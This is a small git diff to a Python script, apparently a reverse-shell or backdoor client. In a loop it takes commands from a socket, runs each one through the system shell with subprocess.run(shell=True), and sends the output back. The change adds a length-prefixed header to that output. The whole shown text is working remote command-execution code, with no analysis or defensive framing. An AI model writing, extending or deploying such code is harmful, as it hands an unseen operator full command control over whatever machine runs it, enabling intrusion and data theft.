@@ -28,7 +28,11 @@ while 1:
     reponse = commande.decode()
     resultat = subprocess.run(reponse, shell=True, capture_output=True, universal_newlines=True)
     data_to_send = resultat.stdout + resultat.stderr
+    header = str(len(data_to_send.encode())).zfill(13)
+    print("header", header)
+    s.sendall(header.encode())
     s.sendall(data_to_send.encode())
+    
 #    if recieve_data:
 #        print(recieve_data.decode())       
 #    else:
